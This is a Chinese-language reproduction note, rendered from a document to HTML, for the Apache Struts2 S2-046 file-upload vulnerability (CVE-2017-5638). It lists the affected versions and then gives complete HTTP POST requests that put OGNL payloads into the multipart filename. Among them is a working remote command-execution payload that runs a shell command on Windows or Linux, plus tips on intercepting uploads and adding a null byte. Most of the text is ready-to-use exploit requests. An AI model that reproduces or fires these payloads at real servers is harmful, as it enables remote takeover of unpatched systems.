<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2017-5638）s2-046</h1><h2>一、漏洞简介</h2><p>使用Jakarta插件，程序没有正确处理文件上传，通过构造HTTP请求头中的Content-type造成RCE</p><h2>二、漏洞影响</h2><p>2.3.5-2.3.31</p><p>2.5.0-2.5.10</p><h2>三、复现过程</h2><p>常见访问路径</p><p>/struts2-showcase/fileupload/doUpload.action<br />/doUpload.action<br />/</p><p>POST / HTTP/1.1<br />Host: www.0-sec.org:8080<br />Content-Length: 549<br />Cache-Control: max-age=0<br />Origin: http://192.168.95.128:8080<br />Upgrade-Insecure-Requests: 1<br />Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6WkqMfQ5bSxtxX4X<br />User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8<br />Referer: http://192.168.95.128:8080/<br />Accept-Encoding: gzip, deflate<br />Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,und;q=0.7<br />Connection: close<br /><br />------WebKitFormBoundary6WkqMfQ5bSxtxX4X<br />Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;Content-Disposition: form-data; name=&quot;image1&quot;; filename=&quot;%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#memberAccess?(#memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#path=#req.getRealPath('/')).(#o.println(#path)).(#o.close())}b&quot;<br />Content-Type: text/plain<br /><br /><br />------WebKitFormBoundary6WkqMfQ5bSxtxX4X</p><p>图片.png</p><p>抓流量 抓到一个 出web目录的 后面自己加\x00b</p><p>%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#path=#req.getRealPath('/')).(#o.println(#path)).(#o.close())}</p><p>跟s2-048 payload是一样的 只有回显 好多都是通用的</p><p>%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}</p><p>还可以找到doUpload.action 然后真提交文件 拦截包 把filename 改了 要加\x00b</p><p>s2-046 特别多的工具都可以用。。抓流量分析流量 分析出来几个功能payload</p><p>安恒工具 命令执行 payload</p><p>POST / HTTP/1.1<br />Host:192.168.95.128:8080<br />Accept-Language: zh_CN<br />User-Agent: Auto Spider 1.0<br />Accept-Encoding: gzip, deflate<br />Connection: close<br />Content-Length: 874<br />Content-Type: multipart/form-data; boundary=---------------------------7e116d19044c<br /><br />-----------------------------7e116d19044c<br />Content-Disposition: form-data; name=&quot;test&quot;; filename=&quot;%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('struts2_security_')).(#res.getWriter().print('check')).(#res.getWriter().flush()).(#res.getWriter().close())}.b&quot;<br />Content-Type: text/plain<br /><br />x<br />-----------------------------7e116d19044c--</p></body></html>